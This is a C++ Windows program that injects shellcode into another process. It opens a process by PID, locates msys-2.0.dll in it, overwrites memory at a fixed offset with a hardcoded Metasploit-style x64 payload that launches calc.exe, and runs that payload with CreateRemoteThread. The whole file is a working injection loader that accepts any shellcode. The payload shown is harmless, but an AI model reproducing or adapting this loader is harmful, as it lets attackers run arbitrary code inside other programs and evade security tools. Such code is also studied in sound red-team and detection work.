#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>

uintptr_t FindModuleBaseAddress(DWORD pid, const wchar_t* moduleName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    MODULEENTRY32 me;
    me.dwSize = sizeof(MODULEENTRY32);

    if (Module32FirstW(hSnapshot, &me)) {
        do {
            if (_wcsicmp(me.szModule, moduleName) == 0) {
                CloseHandle(hSnapshot);
                return (uintptr_t)me.modBaseAddr;
            }
        } while (Module32NextW(hSnapshot, &me));
    }

    CloseHandle(hSnapshot);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cout << "Usage: " << argv[0] << " <PID>" << std::endl;
        return 1;
    }

    DWORD pid = std::atoi(argv[1]);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process." << std::endl;
        return 1;
    }

    uintptr_t baseAddress = FindModuleBaseAddress(pid, L"msys-2.0.dll");
    if (baseAddress == 0) {
        std::cerr << "Failed to find msys-2.0.dll in the target process." << std::endl;
        return 1;
    }

    uintptr_t sectionAddress = baseAddress + 0x1EE200;

    unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
    const SIZE_T shellcodeSize = sizeof(shellcode) - 1;  // Subtract 1 to ignore the null terminator


    std::cout << "Base Address of loaded DLL: " << std::hex << baseAddress << std::endl;
    std::cout << "Address at offset 0x1EE200: " << std::hex << sectionAddress << std::endl;

    SIZE_T bytesRead;
    unsigned char readBuffer[shellcodeSize];  // Make sure shellcodeSize is the size of your shellcode

    if (ReadProcessMemory(hProcess, (LPCVOID)sectionAddress, readBuffer, shellcodeSize, &bytesRead)) {
        std::cout << "Read " << bytesRead << " bytes from target process. Data:" << std::endl;
        for (SIZE_T i = 0; i < bytesRead; ++i) {
            printf("%02X ", readBuffer[i]);
        }
        printf("\n");
    }
    else {
        printf("Failed to read memory. Error: %d\n", GetLastError());
    }


    if (WriteProcessMemory(hProcess, (LPVOID)sectionAddress, shellcode, shellcodeSize, NULL) == 0) {
        std::cerr << "Failed to write shellcode. Error: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "Successfully wrote shellcode to the target process." << std::endl;

    if (ReadProcessMemory(hProcess, (LPCVOID)sectionAddress, readBuffer, shellcodeSize, &bytesRead)) {
        std::cout << "Read " << bytesRead << " bytes from target process. Shellcode from memory of process:" << std::endl;
        for (SIZE_T i = 0; i < bytesRead; ++i) {
            printf("%02X ", readBuffer[i]);
        }
        printf("\n");
    }
    else {
        printf("Failed to read memory. Error: %d\n", GetLastError());
    }

    DWORD threadId;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)sectionAddress, NULL, 0, &threadId);

    if (hThread == NULL) {
        std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Wait for the remote thread to terminate
    WaitForSingleObject(hThread, INFINITE);

    // Close the thread handle
    CloseHandle(hThread);

    std::cout << "Successfully executed shellcode in the target process." << std::endl;

    CloseHandle(hProcess);
    return 0;
}
